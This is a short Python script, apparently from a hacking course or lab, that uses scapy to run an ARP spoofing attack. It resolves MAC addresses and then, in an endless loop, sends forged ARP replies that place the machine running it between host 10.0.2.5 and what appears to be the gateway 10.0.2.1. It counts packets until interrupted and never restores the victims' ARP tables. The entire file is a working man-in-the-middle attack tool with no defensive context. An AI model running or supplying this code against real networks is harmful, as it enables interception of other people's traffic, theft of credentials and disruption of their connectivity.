#!/usr/bin/env python
import scapy.all as scapy
import time
import sys
# scapy.ls(scapy.ARP)
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether()
    broadcast.dst = "ff:ff:ff:ff:ff:ff"
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc
def spoof(target_ip,spoof_ip):
    target_mac=get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet,verbose=False)
packets_sent = 0
try:
    while True:
        spoof("10.0.2.5", "10.0.2.1")
        spoof("10.0.2.1", "10.0.2.5")
        packets_sent = packets_sent+2
        print("\r[+] packets sent:" + str(packets_sent)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[-] Detected ctrl + c")
